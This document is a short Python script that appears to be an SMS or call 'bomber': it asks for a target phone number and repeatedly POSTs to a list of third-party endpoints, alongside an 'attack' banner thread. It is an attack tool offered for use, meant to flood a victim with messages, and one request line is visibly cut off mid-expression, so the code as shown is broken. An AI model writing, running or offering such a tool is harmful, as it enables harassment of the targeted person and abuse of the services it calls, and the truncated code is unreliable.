from data_cs import data
import requests,time,json,warnings
from logo import banner, attack,P,Y
import threading, os
warnings.filterwarnings("ignore")

banner()

u = input(f'{Y}Enter Target Number: ')

def bomber():
    for i in data:
        r = requests.post(i[0]['url'], headers=i[1],data=json.dumps(i[2], separators=(',>
        time.sleep(2.5)
        print()
t1 = threading.Thread(target=attack)
t2 = threading.Thread(target=bomber)

t1.start()
t2.start()

try:
    t1.join()
    t2.join()
except KeyboardInterrupt:
    os.system("clear")
    print(f'{P}Tool Exit! Thanks for Using.')
